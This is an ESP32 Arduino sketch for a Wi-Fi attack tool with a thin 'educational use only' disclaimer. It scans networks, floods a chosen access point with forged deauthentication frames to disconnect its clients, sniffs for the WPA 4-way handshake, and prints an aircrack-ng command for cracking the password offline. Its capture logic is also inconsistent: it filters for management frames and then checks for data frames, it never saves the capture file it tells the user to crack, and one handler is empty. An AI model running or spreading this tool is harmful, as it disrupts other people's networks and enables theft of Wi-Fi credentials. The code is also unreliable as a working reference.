/*
 * W7 — Deauth + Capture
 * Deauthenticate clients and capture WPA handshake for offline cracking
 * 
 * Hardware: ESP32-C6
 * 
 * Features:
 *   - Scan for target networks
 *   - Deauth connected clients
 *   - Capture WPA 4-way handshake
 *   - Save handshake for offline cracking
 * 
 * WARNING: Educational use only. Test on your own lab network.
 * 
 * Author: 5h4d0wn1k
 * License: MIT
 * Date: 2026-08-26
 */

#include <WiFi.h>
#include <esp_wifi.h>

// Configuration
#define MAX_NETWORKS 30
#define DEAUTH_COUNT 50
#define CAPTURE_TIMEOUT 30000  // 30 seconds

// Network structure
struct Network {
    char ssid[33];
    uint8_t bssid[6];
    int rssi;
    uint8_t channel;
    int encryption;  // 0=open, 1=wep, 2=wpa, 3=wpa2, 4=wpa3
};

// Handshake capture
struct HandshakePacket {
    uint8_t data[512];
    int length;
    uint32_t timestamp;
    bool valid;
};

// Global state
Network networks[MAX_NETWORKS];
int network_count = 0;
int selected_network = -1;
HandshakePacket handshake[4];  // 4-way handshake
int handshake_count = 0;
bool capturing = false;

// Deauth packet template
uint8_t deauth_packet[] = {
    0xC0, 0x00,  // Frame control: Deauthentication
    0x3A, 0x01,  // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: will be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: will be filled
    0x00, 0x00,  // Sequence number
    0x07, 0x00   // Reason code: Class 3 frame from non-associated
};

// Function prototypes
void scanNetworks();
void selectNetwork(int index);
void startDeauth();
void startCapture();
void processPacket(uint8_t* data, int len);
void showHelp();

// Promiscuous mode callback
void IRAM_ATTR promiscuous_rx(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!capturing) return;
    if (type != WIFI_PKT_MGMT) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint16_t frame_ctrl = *(uint16_t*)pkt->payload;
    uint8_t frame_type = (frame_ctrl >> 2) & 0x3;
    uint8_t frame_subtype = (frame_ctrl >> 4) & 0xF;
    
    // Capture EAPOL frames (WPA handshake)
    if (frame_type == 2 && frame_subtype == 0) {  // Data frame
        // Check for EAPOL (4-byte header after 802.11 header)
        int offset = 24;  // Skip 802.11 header
        if (pkt->payload[offset] == 0xAA && pkt->payload[offset + 1] == 0xAA) {
            // SNAP header detected
            offset += 8;
            
            if (pkt->payload[offset] == 0x88 && pkt->payload[offset + 1] == 0x8E) {
                // EAPOL protocol
                offset += 2;
                
                // Check if this is a handshake packet
                if (handshake_count < 4) {
                    memcpy(handshake[handshake_count].data, pkt->payload, pkt->len);
                    handshake[handshake_count].length = pkt->len;
                    handshake[handshake_count].timestamp = millis();
                    handshake[handshake_count].valid = true;
                    
                    handshake_count++;
                    
                    Serial.printf("\n[EAPOL] Handshake %d/4 captured (%d bytes)\n", 
                                 handshake_count, pkt->len);
                }
            }
        }
    }
}

void setup() {
    Serial.begin(115200);
    Serial.println("\n=== W7 — Deauth + Capture ===");
    Serial.println("Capture WPA handshake for offline cracking");
    Serial.println("WARNING: Educational use only!");
    Serial.println();
    
    // Initialize WiFi
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    // Enable promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_rx);
    
    Serial.println("WiFi initialized in promiscuous mode");
    Serial.println();
    showHelp();
}

void loop() {
    // Handle serial commands
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        if (cmd == "help") {
            showHelp();
        } else if (cmd == "scan") {
            scanNetworks();
        } else if (cmd.startsWith("select ")) {
            int idx = cmd.substring(7).toInt();
            selectNetwork(idx);
        } else if (cmd == "deauth") {
            startDeauth();
        } else if (cmd == "capture") {
            startCapture();
        } else if (cmd == "status") {
            Serial.printf("Handshake: %d/4 packets\n", handshake_count);
        } else {
            Serial.println("Unknown command. Type 'help' for commands.");
        }
    }
}

void showHelp() {
    Serial.println("\n=== Commands ===");
    Serial.println("scan        - Scan for networks");
    Serial.println("select N    - Select network N");
    Serial.println("deauth      - Send deauth packets");
    Serial.println("capture     - Start handshake capture");
    Serial.println("status      - Show capture status");
    Serial.println("help        - Show this help");
    Serial.println("================\n");
}

void scanNetworks() {
    Serial.println("\nScanning for networks...");
    
    network_count = WiFi.scanNetworks();
    if (network_count > MAX_NETWORKS) network_count = MAX_NETWORKS;
    
    Serial.println("\n=== Available Networks ===");
    for (int i = 0; i < network_count; i++) {
        strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 32);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        networks[i].encryption = WiFi.encryptionType(i);
        
        const char* enc = "OPEN";
        if (networks[i].encryption == WIFI_AUTH_WEP) enc = "WEP";
        else if (networks[i].encryption == WIFI_AUTH_WPA_PSK) enc = "WPA";
        else if (networks[i].encryption == WIFI_AUTH_WPA2_PSK) enc = "WPA2";
        else if (networks[i].encryption == WIFI_AUTH_WPA3_PSK) enc = "WPA3";
        
        Serial.printf("[%2d] %-32s CH:%2d RSSI:%3d %s\n",
                     i, networks[i].ssid, networks[i].channel,
                     networks[i].rssi, enc);
    }
    Serial.println("========================\n");
}

void selectNetwork(int index) {
    if (index < 0 || index >= network_count) {
        Serial.println("Invalid network index!");
        return;
    }
    
    selected_network = index;
    Serial.printf("Selected: %s (CH:%d)\n", 
                 networks[index].ssid, networks[index].channel);
}

void startDeauth() {
    if (selected_network < 0) {
        Serial.println("No network selected!");
        return;
    }
    
    Serial.printf("\n=== Deauth Attack on %s ===\n", 
                 networks[selected_network].ssid);
    
    // Set channel
    esp_wifi_set_channel(networks[selected_network].channel, WIFI_SECOND_CHAN_NONE);
    
    // Fill in source and BSSID
    memcpy(&deauth_packet[10], networks[selected_network].bssid, 6);
    memcpy(&deauth_packet[16], networks[selected_network].bssid, 6);
    
    // Send deauth packets
    for (int i = 0; i < DEAUTH_COUNT; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
        delay(10);
        
        if ((i + 1) % 10 == 0) {
            Serial.printf("  Sent %d/%d deauth packets\n", i + 1, DEAUTH_COUNT);
        }
    }
    
    Serial.println("Deauth attack complete!");
    Serial.println("Clients should be disconnecting...");
}

void startCapture() {
    if (selected_network < 0) {
        Serial.println("No network selected!");
        return;
    }
    
    Serial.printf("\n=== Capturing Handshake for %s ===\n", 
                 networks[selected_network].ssid);
    Serial.println("Waiting for EAPOL frames...");
    Serial.println("Press any key to stop\n");
    
    capturing = true;
    handshake_count = 0;
    uint32_t start_time = millis();
    
    while (!Serial.available() && handshake_count < 4) {
        if (millis() - start_time > CAPTURE_TIMEOUT) {
            Serial.println("\nCapture timeout! Try deauth again.");
            break;
        }
        delay(100);
    }
    
    capturing = false;
    
    if (handshake_count == 4) {
        Serial.println("\n*** HANDSHAKE CAPTURED! ***");
        Serial.println("4/4 EAPOL packets captured");
        Serial.println("Use aircrack-ng to crack offline:");
        Serial.printf("  aircrack-ng -w wordlist.txt -b %02X:%02X:%02X:%02X:%02X:%02X capture.cap\n",
                     networks[selected_network].bssid[0],
                     networks[selected_network].bssid[1],
                     networks[selected_network].bssid[2],
                     networks[selected_network].bssid[3],
                     networks[selected_network].bssid[4],
                     networks[selected_network].bssid[5]);
    } else {
        Serial.printf("\nCaptured %d/4 handshake packets\n", handshake_count);
        Serial.println("Try deauth again to force handshake");
    }
    
    Serial.read();  // Clear keypress
}

void processPacket(uint8_t* data, int len) {
    // Process captured packets
}
